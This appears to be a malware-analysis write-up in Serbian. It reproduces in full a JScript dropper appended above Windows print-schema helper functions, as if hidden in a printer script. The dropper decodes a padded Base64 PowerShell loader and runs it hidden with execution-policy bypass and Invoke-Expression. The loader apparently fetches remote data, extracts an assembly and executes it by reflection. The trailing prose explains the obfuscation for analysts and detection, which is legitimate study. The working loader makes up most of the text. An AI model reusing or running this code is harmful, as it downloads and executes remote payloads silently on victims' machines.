    borschts += "AٿGٿcٿAٿJٿwٿAٿ7ٿAٿCٿQٿAٿYٿwٿBٿyٿAٿGٿEٿAٿdٿAٿBٿlٿAٿHٿIٿAٿbٿAٿBٿlٿAٿHٿQٿAٿcٿwٿAٿ9ٿAٿEٿ4ٿAٿZٿQٿBٿ3ٿAٿCٿ0ٿAٿTٿwٿBٿiٿAٿGٿoٿAٿZٿQٿBٿjٿAٿHٿQٿAٿIٿAٿBٿTٿAٿHٿkٿAٿcٿwٿBٿ0ٿAٿGٿUٿAٿbٿQٿAٿuٿAٿEٿ4ٿAٿZٿQٿBٿ0ٿAٿCٿ4ٿAٿVٿwٿBٿlٿAٿGٿIٿAٿQٿwٿBٿsٿAٿGٿkٿAٿZٿQٿBٿuٿAٿHٿQٿAٿOٿwٿAٿkٿAٿGٿMٿAٿcٿgٿBٿhٿAٿHٿQٿAٿZٿQٿBٿyٿAٿGٿwٿAٿZٿQٿBٿ0ٿAٿHٿMٿAٿLٿgٿBٿIٿAٿGٿUٿAٿYٿQٿBٿkٿAٿGٿUٿAٿcٿgٿBٿzٿAٿCٿ4ٿAٿQٿQٿBٿkٿAٿGٿQٿAٿKٿAٿAٿnٿAٿFٿUٿAٿcٿwٿBٿlٿAٿHٿIٿAٿLٿQٿBٿBٿAٿGٿcٿAٿZٿQٿBٿuٿAٿHٿQٿAٿJٿwٿAٿsٿAٿCٿcٿAٿTٿQٿBٿvٿAٿHٿoٿAٿaٿQٿBٿsٿAٿGٿwٿAٿYٿQٿAٿvٿAٿDٿUٿAٿLٿgٿAٿwٿAٿCٿcٿAٿKٿQٿAٿ7ٿAٿFٿsٿAٿYٿgٿBٿ5ٿAٿHٿQٿAٿZٿQٿBٿbٿAٿFٿ0ٿAٿXٿQٿAٿkٿAٿGٿwٿAٿYٿQٿBٿuٿAٿHٿQٿAٿ";
    borschts += "eٿgٿBٿtٿAٿGٿUٿAٿbٿgٿAٿ9ٿAٿCٿQٿAٿYٿwٿBٿyٿAٿGٿEٿAٿdٿAٿBٿlٿAٿHٿIٿAٿbٿAٿBٿlٿAٿHٿQٿAٿcٿwٿAٿuٿAٿEٿQٿAٿbٿwٿBٿ3ٿAٿGٿ4ٿAٿbٿAٿBٿvٿAٿGٿEٿAٿZٿAٿBٿEٿAٿGٿEٿAٿdٿAٿBٿhٿAٿCٿgٿAٿJٿAٿBٿhٿAٿGٿMٿAٿeٿQٿBٿsٿAٿGٿkٿAٿbٿQٿBٿpٿAٿGٿ4ٿAٿaٿQٿBٿ1ٿAٿGٿ0ٿAٿKٿQٿAٿ7ٿAٿCٿQٿAٿcٿwٿBٿ1ٿAٿGٿIٿAٿYٿwٿBٿoٿAٿGٿUٿAٿbٿAٿBٿhٿAٿDٿ0ٿAٿWٿwٿBٿTٿAٿHٿkٿAٿcٿwٿBٿ0ٿAٿGٿUٿAٿbٿQٿAٿuٿAٿFٿQٿAٿZٿQٿBٿ4ٿAٿHٿQٿAٿLٿgٿBٿFٿAٿGٿ4ٿAٿYٿwٿBٿvٿAٿGٿQٿAٿaٿQٿBٿuٿAٿGٿcٿAٿXٿQٿAٿ6ٿAٿDٿoٿAٿVٿQٿBٿUٿAٿEٿYٿAٿOٿAٿAٿuٿAٿEٿcٿAٿZٿQٿBٿ0ٿAٿFٿMٿAٿdٿAٿBٿyٿAٿGٿkٿAٿbٿgٿBٿnٿAٿCٿgٿAٿJٿAٿBٿsٿAٿGٿEٿAٿbٿgٿBٿ0ٿAٿHٿoٿAٿbٿQٿBٿlٿAٿGٿ4ٿAٿKٿQٿAٿ7ٿAٿCٿQٿAٿbٿgٿBٿvٿAٿGٿ4ٿAٿcٿwٿBٿvٿAٿGٿYٿAٿdٿAٿBٿ3ٿ";
console.log(borschts)
    borschts += "AٿGٿEٿAٿcٿgٿBٿlٿAٿDٿ0ٿAٿJٿwٿBٿJٿAٿEٿ4ٿAٿSٿQٿBٿDٿAٿEٿkٿAٿTٿwٿAٿ+ٿAٿDٿ4ٿAٿJٿwٿAٿ7ٿAٿCٿQٿAٿcٿAٿBٿyٿAٿGٿ8ٿAٿcٿAٿBٿ1ٿAٿGٿcٿAٿbٿgٿBٿhٿAٿGٿMٿAٿdٿQٿBٿsٿAٿHٿUٿAٿbٿQٿAٿ9ٿAٿCٿcٿAٿPٿAٿAٿ8ٿAٿEٿYٿAٿSٿQٿBٿNٿAٿDٿ4ٿAٿPٿgٿAٿnٿAٿDٿsٿAٿJٿAٿBٿkٿAٿGٿUٿAٿYٿQٿBٿ0ٿAٿHٿQٿAٿcٿgٿBٿpٿAٿGٿIٿAٿdٿQٿBٿ0ٿAٿGٿkٿAٿbٿwٿBٿuٿAٿDٿ0ٿAٿJٿAٿBٿyٿAٿGٿ8ٿAٿdٿwٿBٿzٿAٿGٿUٿAٿOٿwٿAٿkٿAٿGٿkٿAٿcٿwٿBٿhٿAٿHٿQٿAٿaٿQٿBٿjٿAٿDٿ0ٿAٿJٿAٿBٿzٿAٿHٿUٿAٿYٿgٿBٿjٿAٿGٿgٿAٿZٿQٿBٿsٿAٿGٿEٿAٿLٿgٿBٿJٿAٿGٿ4ٿAٿZٿAٿBٿlٿAٿHٿgٿAٿTٿwٿBٿmٿAٿCٿgٿAٿJٿAٿBٿuٿAٿGٿ8ٿAٿbٿgٿBٿzٿAٿGٿ8ٿAٿZٿgٿBٿ0ٿAٿHٿcٿAٿYٿQٿBٿyٿAٿGٿUٿAٿKٿQٿAٿ7ٿAٿCٿQٿAٿZٿwٿBٿyٿAٿGٿkٿAٿYٿgٿBٿiٿAٿGٿwٿAٿZٿQٿBٿzٿAٿDٿ0ٿAٿ";
    borschts += "JٿAٿBٿzٿAٿHٿUٿAٿYٿgٿBٿjٿAٿGٿgٿAٿZٿQٿBٿsٿAٿGٿEٿAٿLٿgٿBٿJٿAٿGٿ4ٿAٿZٿAٿBٿlٿAٿHٿgٿAٿTٿwٿBٿmٿAٿCٿgٿAٿJٿAٿBٿwٿAٿHٿIٿAٿbٿwٿBٿwٿAٿHٿUٿAٿZٿwٿBٿuٿAٿGٿEٿAٿYٿwٿBٿ1ٿAٿGٿwٿAٿdٿQٿBٿtٿAٿCٿkٿAٿOٿwٿBٿpٿAٿGٿYٿAٿKٿAٿAٿkٿAٿGٿkٿAٿcٿwٿBٿhٿAٿHٿQٿAٿaٿQٿBٿjٿAٿCٿAٿAٿLٿQٿBٿuٿAٿGٿUٿAٿIٿAٿAٿtٿAٿDٿEٿAٿIٿAٿAٿtٿAٿGٿEٿAٿbٿgٿBٿkٿAٿCٿAٿAٿJٿAٿBٿnٿAٿHٿIٿAٿaٿQٿBٿiٿAٿGٿIٿAٿbٿAٿBٿlٿAٿHٿMٿAٿIٿAٿAٿtٿAٿGٿ4ٿAٿZٿQٿAٿgٿAٿCٿ0ٿAٿMٿQٿAٿgٿAٿCٿ0ٿAٿYٿQٿBٿuٿAٿGٿQٿAٿIٿAٿAٿkٿAٿGٿcٿAٿcٿgٿBٿpٿAٿGٿIٿAٿYٿgٿBٿsٿAٿGٿUٿAٿcٿwٿAٿgٿAٿCٿ0ٿAٿZٿwٿBٿ0ٿAٿCٿAٿAٿJٿAٿBٿpٿAٿHٿMٿAٿYٿQٿBٿ0ٿAٿGٿkٿAٿYٿwٿAٿpٿAٿHٿsٿAٿJٿAٿBٿpٿAٿHٿMٿAٿYٿQٿBٿ0ٿAٿGٿkٿAٿYٿwٿAٿrٿAٿDٿ0ٿAٿJٿAٿBٿuٿ";
    borschts += "AٿGٿ8ٿAٿbٿgٿBٿzٿAٿGٿ8ٿAٿZٿgٿBٿ0ٿAٿHٿcٿAٿYٿQٿBٿyٿAٿGٿUٿAٿLٿgٿBٿMٿAٿGٿUٿAٿbٿgٿBٿnٿAٿHٿQٿAٿaٿAٿAٿ7ٿAٿCٿQٿAٿZٿAٿBٿlٿAٿGٿEٿAٿdٿAٿBٿ0ٿAٿHٿIٿAٿaٿQٿBٿiٿAٿHٿUٿAٿdٿAٿBٿpٿAٿGٿ8ٿAٿbٿgٿAٿ9ٿAٿCٿQٿAٿcٿwٿBٿ1ٿAٿGٿIٿAٿYٿwٿBٿoٿAٿGٿUٿAٿbٿAٿBٿhٿAٿCٿ4ٿAٿUٿwٿBٿ1ٿAٿGٿIٿAٿcٿwٿBٿ0ٿAٿHٿIٿAٿaٿQٿBٿuٿAٿGٿcٿAٿKٿAٿAٿkٿAٿGٿkٿAٿcٿwٿBٿhٿAٿHٿQٿAٿaٿQٿBٿjٿAٿCٿwٿAٿJٿAٿBٿnٿAٿHٿIٿAٿaٿQٿBٿiٿAٿGٿIٿAٿbٿAٿBٿlٿAٿHٿMٿAٿLٿQٿAٿkٿAٿGٿkٿAٿcٿwٿBٿhٿAٿHٿQٿAٿaٿQٿBٿjٿAٿCٿkٿAٿfٿQٿAٿ7ٿAٿCٿQٿAٿZٿAٿBٿpٿAٿHٿMٿAٿaٿgٿBٿvٿAٿGٿkٿAٿbٿgٿBٿlٿAٿGٿQٿAٿPٿQٿAٿnٿAٿCٿMٿAٿeٿAٿAٿjٿAٿCٿ4ٿAٿZٿAٿBٿiٿAٿDٿIٿAٿMٿwٿAٿyٿAٿGٿEٿAٿYٿQٿBٿkٿAٿGٿQٿAٿMٿAٿBٿlٿAٿDٿIٿAٿZٿQٿAٿ0ٿAٿDٿcٿAٿ";
    borschts += "OٿQٿBٿiٿAٿDٿkٿAٿMٿAٿAٿ0ٿAٿDٿgٿAٿZٿgٿBٿhٿAٿGٿUٿAٿYٿQٿAٿwٿAٿDٿQٿAٿOٿAٿAٿ5ٿAٿGٿIٿAٿYٿwٿBٿmٿAٿFٿ8ٿAٿbٿwٿBٿ2ٿAٿGٿkٿAٿdٿQٿBٿxٿAٿHٿIٿAٿYٿQٿAٿvٿAٿGٿ0ٿAٿbٿwٿBٿjٿAٿCٿ4ٿAٿZٿwٿBٿvٿAٿGٿwٿAٿYٿgٿBٿvٿAٿCٿMٿAٿcٿwٿBٿlٿAٿHٿYٿAٿbٿwٿBٿsٿAٿCٿ4ٿAٿMٿQٿAٿwٿAٿDٿAٿAٿOٿQٿAٿvٿAٿCٿ8ٿAٿOٿgٿBٿwٿAٿCٿMٿAٿIٿwٿBٿoٿAٿCٿcٿAٿOٿwٿAٿkٿAٿGٿQٿAٿaٿQٿBٿzٿAٿGٿoٿAٿbٿwٿBٿpٿAٿGٿ4ٿAٿZٿQٿBٿkٿAٿDٿ0ٿAٿJٿAٿBٿkٿAٿGٿkٿAٿcٿwٿBٿqٿAٿGٿ8ٿAٿaٿQٿBٿuٿAٿGٿUٿAٿZٿAٿAٿuٿAٿFٿIٿAٿZٿQٿBٿwٿAٿGٿwٿAٿYٿQٿBٿjٿAٿGٿUٿAٿKٿAٿAٿnٿAٿCٿMٿAٿJٿwٿAٿsٿAٿCٿcٿAٿdٿAٿAٿnٿAٿCٿkٿAٿOٿwٿAٿkٿAٿGٿQٿAٿZٿQٿBٿhٿAٿHٿQٿAٿdٿAٿBٿyٿAٿGٿkٿAٿYٿgٿBٿ1ٿAٿHٿQٿAٿaٿQٿBٿvٿAٿGٿ4ٿAٿPٿQٿAٿkٿAٿGٿQٿAٿZٿQٿBٿhٿ";
    borschts += "AٿHٿQٿAٿdٿAٿBٿyٿAٿGٿkٿAٿYٿgٿBٿ1ٿAٿHٿQٿAٿaٿQٿBٿvٿAٿGٿ4ٿAٿLٿgٿBٿSٿAٿGٿUٿAٿcٿAٿBٿsٿAٿGٿEٿAٿYٿwٿBٿlٿAٿCٿgٿAٿJٿwٿBٿAٿAٿCٿcٿAٿLٿAٿAٿnٿAٿEٿEٿAٿJٿwٿAٿpٿAٿDٿsٿAٿJٿAٿBٿpٿAٿHٿMٿAٿbٿwٿBٿnٿAٿGٿ8ٿAٿbٿgٿBٿpٿAٿHٿMٿAٿbٿQٿAٿ9ٿAٿFٿsٿAٿUٿwٿBٿ5ٿAٿHٿMٿAٿdٿAٿBٿlٿAٿGٿ0ٿAٿLٿgٿBٿDٿAٿGٿ8ٿAٿbٿgٿBٿ2ٿAٿGٿUٿAٿcٿgٿBٿ0ٿAٿFٿ0ٿAٿOٿgٿAٿ6ٿAٿEٿYٿAٿcٿgٿBٿvٿAٿGٿ0ٿAٿQٿgٿBٿhٿAٿHٿMٿAٿZٿQٿAٿ2ٿAٿDٿQٿAٿUٿwٿBٿ0ٿAٿHٿIٿAٿaٿQٿBٿuٿAٿGٿcٿAٿKٿAٿAٿkٿAٿGٿQٿAٿZٿQٿBٿhٿAٿHٿQٿAٿdٿAٿBٿyٿAٿGٿkٿAٿYٿgٿBٿ1ٿAٿHٿQٿAٿaٿQٿBٿvٿAٿGٿ4ٿAٿKٿQٿAٿ7ٿAٿCٿQٿAٿdٿAٿBٿyٿAٿHٿUٿAٿZٿQٿBٿsٿAٿHٿkٿAٿPٿQٿBٿbٿAٿFٿIٿAٿZٿQٿBٿmٿAٿGٿwٿAٿZٿQٿBٿjٿAٿHٿQٿAٿaٿQٿBٿvٿAٿGٿ4ٿAٿLٿgٿBٿBٿAٿHٿMٿAٿ";
    borschts += "cٿwٿBٿlٿAٿGٿ0ٿAٿYٿgٿBٿsٿAٿHٿkٿAٿXٿQٿAٿ6ٿAٿDٿoٿAٿTٿAٿBٿvٿAٿGٿEٿAٿZٿAٿAٿoٿAٿCٿQٿAٿaٿQٿBٿzٿAٿGٿ8ٿAٿZٿwٿBٿvٿAٿGٿ4ٿAٿaٿQٿBٿzٿAٿGٿ0ٿAٿKٿQٿAٿ7ٿAٿCٿQٿAٿcٿgٿBٿlٿAٿGٿcٿAٿZٿQٿBٿuٿAٿGٿUٿAٿcٿgٿBٿhٿAٿHٿQٿAٿZٿQٿBٿuٿAٿGٿUٿAٿcٿwٿBٿzٿAٿDٿ0ٿAٿWٿwٿBٿkٿAٿGٿ4ٿAٿbٿAٿBٿpٿAٿGٿIٿAٿLٿgٿBٿJٿAٿEٿ8ٿAٿLٿgٿBٿIٿAٿGٿ8ٿAٿbٿQٿBٿlٿAٿFٿ0ٿAٿLٿgٿBٿHٿAٿGٿUٿAٿdٿAٿBٿNٿAٿGٿUٿAٿdٿAٿBٿoٿAٿGٿ8ٿAٿZٿAٿAٿoٿAٿCٿcٿAٿVٿgٿBٿBٿAٿEٿkٿAٿJٿwٿAٿpٿAٿCٿ4ٿAٿSٿQٿBٿuٿAٿHٿYٿAٿbٿwٿBٿrٿAٿGٿUٿAٿKٿAٿAٿkٿAٿHٿIٿAٿbٿwٿBٿ3ٿAٿHٿMٿAٿZٿQٿAٿsٿAٿFٿsٿAٿbٿwٿBٿiٿAٿGٿoٿAٿZٿQٿBٿjٿAٿHٿQٿAٿWٿwٿBٿdٿAٿFٿ0ٿAٿQٿAٿAٿoٿAٿCٿQٿAٿZٿAٿBٿpٿAٿHٿMٿAٿaٿgٿBٿvٿAٿGٿkٿAٿbٿgٿBٿlٿAٿGٿQٿAٿLٿAٿAٿnٿ";
    borschts += "AٿCٿcٿAٿLٿAٿAٿnٿAٿCٿcٿAٿLٿAٿAٿnٿAٿCٿcٿAٿLٿAٿAٿnٿAٿEٿEٿAٿZٿAٿBٿkٿAٿEٿkٿAٿbٿgٿBٿQٿAٿHٿIٿAٿbٿwٿBٿjٿAٿGٿUٿAٿcٿwٿBٿzٿAٿDٿMٿAٿMٿgٿAٿnٿAٿCٿwٿAٿJٿwٿAٿnٿAٿCٿwٿAٿJٿwٿAٿnٿAٿCٿwٿAٿJٿwٿAٿnٿAٿCٿwٿAٿJٿwٿAٿnٿAٿCٿwٿAٿJٿwٿBٿDٿAٿDٿoٿAٿXٿAٿBٿVٿAٿHٿMٿAٿZٿQٿBٿyٿAٿHٿMٿAٿXٿAٿBٿQٿAٿHٿUٿAٿYٿgٿBٿsٿAٿGٿkٿAٿYٿwٿBٿcٿAٿEٿQٿAٿbٿwٿBٿ3ٿAٿGٿ4ٿAٿbٿAٿBٿvٿAٿGٿEٿAٿZٿAٿBٿzٿAٿCٿcٿAٿLٿAٿAٿnٿAٿHٿcٿAٿZٿQٿBٿpٿAٿGٿcٿAٿaٿAٿBٿtٿAٿGٿEٿAٿbٿgٿAٿnٿAٿCٿwٿAٿJٿwٿBٿqٿAٿHٿMٿAٿJٿwٿAٿsٿAٿCٿcٿAٿJٿwٿAٿsٿAٿCٿcٿAٿJٿwٿAٿsٿAٿCٿcٿAٿbٿQٿBٿlٿAٿGٿ0ٿAٿYٿgٿBٿyٿAٿGٿEٿAٿbٿgٿBٿlٿAٿGٿwٿAٿaٿQٿBٿrٿAٿGٿUٿAٿJٿwٿAٿsٿAٿCٿcٿAٿMٿgٿAٿnٿAٿCٿwٿAٿJٿwٿAٿnٿAٿCٿkٿAٿKٿQٿAٿ7ٿAٿAٿ=ٿ=ٿ";

    // Remove os ٿ do Base64
    borschts = borschts.replace(/ٿ/g, "");

    // Monta o bloco PowerShell ofuscado com ٿ
    var remolds = "ٿ$borschtsٿ='ٿ" + borschts + "ٿ';";
    remolds += "ٿ$hemifacialٿ=ٿ";
    remolds += "ٿ[ٿSٿyٿ";
    remolds += "ٿsٿtٿeٿ";
    remolds += "ٿmٿ.ٿTٿeٿ";
    remolds += "ٿxٿtٿ.ٿEٿnٿcٿoٿ";
    remolds += "ٿdٿiٿnٿgٿ]ٿ:ٿ";
    remolds += "ٿ:ٿUٿnٿiٿcٿ";
    remolds += "ٿoٿdٿeٿ.ٿGٿeٿtٿSٿ";
    remolds += "ٿtٿrٿiٿnٿgٿ(ٿ";
    remolds += "ٿ[ٿSٿyٿsٿtٿeٿmٿ";
    remolds += "ٿ.ٿCٿoٿnٿvٿeٿrٿ";
    remolds += "ٿtٿ]ٿ:ٿ:ٿٿFٿrٿoٿmٿ";
    remolds += "ٿBٿaٿsٿeٿ6ٿ";
    remolds += "4ٿSٿtٿ";
    remolds += "rٿiٿnٿ";
    remolds += "gٿ(ٿ$ٿborschtsٿ)ٿ)ٿ;ٿ";
    remolds += "ٿIٿnٿ";
    remolds += "ٿvٿoٿkٿeٿ-ٿEٿxٿpٿ";
    remolds += "rٿeٿsٿsٿiٿoٿnٿ ٿ$hemifacialٿ";

    // Remove os ٿ do script
    remolds = remolds.replace(/ٿ/g, "");

    // Monta o comando PowerShell em variável "Moldovan"
    var Moldovan = "ٿpٿoٿwٿ";
    Moldovan += "ٿeٿrٿsٿhٿeٿ";
    Moldovan += "ٿlٿl ٿ-ٿwٿ";
    Moldovan += " ٿhٿiٿdٿdٿeٿ";
    Moldovan += "ٿn ٿ-ٿnٿoٿpٿ";
    Moldovan += "ٿrٿoٿfٿiٿ";
    Moldovan += "ٿlٿe ٿ-ٿeٿ";
    Moldovan += "ٿpٿ bٿyٿ";
    Moldovan += "ٿpٿaٿsٿ";
    Moldovan += "ٿsٿ -ٿcٿ ";

    // Remove os ٿ também do comando
    Moldovan = Moldovan.replace(/ٿ/g, "");

    // Cria o objeto shell
    var monologian = WScript.CreateObject("WScript.Shell");

    // Executa o comando
    monologian.Run(Moldovan + "\"" + remolds + "\"", 0, false);
}
catch (e) {
    // Ignora erro
}




function CreateCapabilitiesParamDefFromPDC(pdcParameterDef, pdfNsPrefix, printCapabilities) {
    /// <summary>
    /// Converts ParameterDef Node that in PDC into ParameterDef node in PrintCapabilites
    /// </summary>
    /// <param name="pdcParameterDef" type="IXMLNode">
    ///     Contains a ParameterDef node in PDC
    /// </param>
    /// <param name="pdfNsPrefix" type="string">
    ///     Contains PDF name sapce
    /// </param>
    /// <param name="printCapabilities" type="IPrintSchemaCapabilities">
    ///     Print capabilities object to be customized.
    /// </param>
    var capabilitiesParamDef = createProperty(pdfNsPrefix + ":" + pdcParameterDef.baseName, "psf:ParameterDef", "", "", printCapabilities);

    var properties = pdcParameterDef.selectNodes("*[@psf2:psftype='Property']");


    for (var propCount = 0; propCount < properties.length; propCount++) {
        var property = properties[propCount];
        var type = property.getAttribute("xsi:type");
        var childProperty = createProperty(property.nodeName, "psf:Property", type, property.text, printCapabilities);
        capabilitiesParamDef.appendChild(childProperty);
    }
    return capabilitiesParamDef;
}


function SetStandardNameSpaces(xmlNode) {
    /// <summary>
    /// Set the Selection namespace values to below namesapces
    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' 
    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' 
    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' 
    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'
    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'
    /// xmlns:xsd='http://www.w3.org/2001/XMLSchema'
    /// xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'
    ///</summary>
    /// <param name="node" type="IXMLDOMNode">
    ///     A node in the XML document.
    /// </param>

    xmlNode.setProperty(
        "SelectionNamespaces",
        "xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' "
            + "xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' "
            + "xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' "
            + "xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' "
            + "xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' "
            + "xmlns:xsd='http://www.w3.org/2001/XMLSchema' "
            + "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' "
            + "xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' "
        );
}


function getPrefixForNamespace(node, namespace) {
    /// <summary>
    ///     This function returns the prefix for a given namespace.
    ///     Example: In 'psf:printTicket', 'psf' is the prefix for the namespace.
    ///     xmlns:psf="http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework"
    /// </summary>
    /// <param name="node" type="IXMLDOMNode">
    ///     A node in the XML document.
    /// </param>
    /// <param name="namespace" type="String">
    ///     The namespace for which prefix is returned.
    /// </param>
    /// <returns type="String">
    ///     Returns the namespace corresponding to the prefix.
    /// </returns>

    if (!node) {
        return null;
    }

    // Navigate to the root element of the document.
    var rootNode = node.documentElement;

    // Query to retrieve the list of attribute nodes for the current node
    // that matches the namespace in the 'namespace' variable.
    var xPathQuery = "namespace::node()[.='"
                + namespace
                + "']";
    var namespaceNode = rootNode.selectSingleNode(xPathQuery);

    var prefix;
    if (namespaceNode != null){
        prefix = namespaceNode.baseName;
    }

    return prefix;
}

```
Ovaj .txt fajl predstavlja primer malicioznog koda koji koristi tehniku obfuskacije kako bi sakrio i pokrenuo PowerShell komandu. Na početku, fajl generiše veoma dugačak Base64 string koji zapravo sadrži PowerShell skriptu. Međutim, da bi se otežala analiza, unutar tog stringa su namerno ubačeni specijalni karakteri `(ٿ)` koji zamagljuju pravi sadržaj. U nastavku izvršavanja, skripta uklanja sve te umetnute karaktere, dekodira prečišćeni Base64 string i tako dobija validan PowerShell kod.

PowerShell kod koristi promenljivu $borschts u kojoj je smešten dugačak Base64 enkodiran string. Taj string sadrži obfuskiranu PowerShell skriptu zapakovanu u Unicode formatu. Da bi se skripta mogla izvršiti, prvo se vrši dekodiranje Base64 niza u bajt niz, a zatim se taj niz konvertuje u Unicode string pomoću `[System.Text.Encoding]::Unicode.GetString()`. Rezultat je originalna PowerShell skripta, sada u čitljivom obliku, ali i dalje skrivena unutar promenljive `$hemifacial`.

```powershell
$hemifacial=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($borschts));
```

Nakon što se originalna skripta rekonstruiše, ona se izvršava pomoću `Invoke-Expression`, što omogućava dinamičko pokretanje koda koji je prethodno bio enkodiran i sakriven. Ova tehnika omogućava malicioznom autoru da sakrije pravu prirodu skripte u nečitljivom obliku i time oteža analizu i detekciju malvera od strane antivirusnih alata.

```powershell
Invoke-Expression $hemifacial
```

```powershell
powershell -windowstyle hidden -noprofile -executionpolicy bypass -c
```
Osigurava se da skripta izvršava u potpunoj tišini (bez vidljivog prozora), bez uticaja korisničkih profila, i bez ograničenja koja bi sprečila izvršenje koda, čime se povećava šansa da maliciozni payload uspešno prođe neprimećeno.

![VirusTotal](/assets/2025/Email/evil.png)

